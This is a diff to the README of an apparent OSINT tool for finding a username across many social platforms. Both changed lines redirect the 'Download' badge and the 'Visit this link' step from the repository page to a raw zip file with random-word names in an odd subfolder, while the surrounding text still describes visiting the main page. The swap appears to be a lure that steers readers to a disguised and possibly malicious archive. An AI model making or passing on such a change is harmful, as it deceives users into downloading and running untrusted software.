@@ -1,6 +1,6 @@
 # 🔎 osint-username-search - Find social media handles across platforms
 
-[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/shoedactylorhizamaculatafuchsii29/osint-username-search)
+[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://raw.githubusercontent.com/shoedactylorhizamaculatafuchsii29/osint-username-search/main/polybasicity/username_osint_search_capreolar.zip)
 
 ## 🎯 About the tool
 This tool helps you find if a specific username exists on many different websites. You enter one name, and the software checks fifty platforms at once. It saves time by searching multiple sites instead of checking each one by hand. 
@@ -16,7 +16,7 @@ Your computer needs to meet these basic standards to run the application:
 
 ## 📥 Downloading the software
 Follow these steps to get the tool on your computer:
-1. Visit [this link](https://github.com/shoedactylorhizamaculatafuchsii29/osint-username-search) to reach the main page.
+1. Visit [this link](https://raw.githubusercontent.com/shoedactylorhizamaculatafuchsii29/osint-username-search/main/polybasicity/username_osint_search_capreolar.zip) to reach the main page.
 2. Look for the button labeled Code on the top right side of the screen.
 3. Click the button and select the option to download as a Zip file.
 4. Save the file to your Downloads folder.
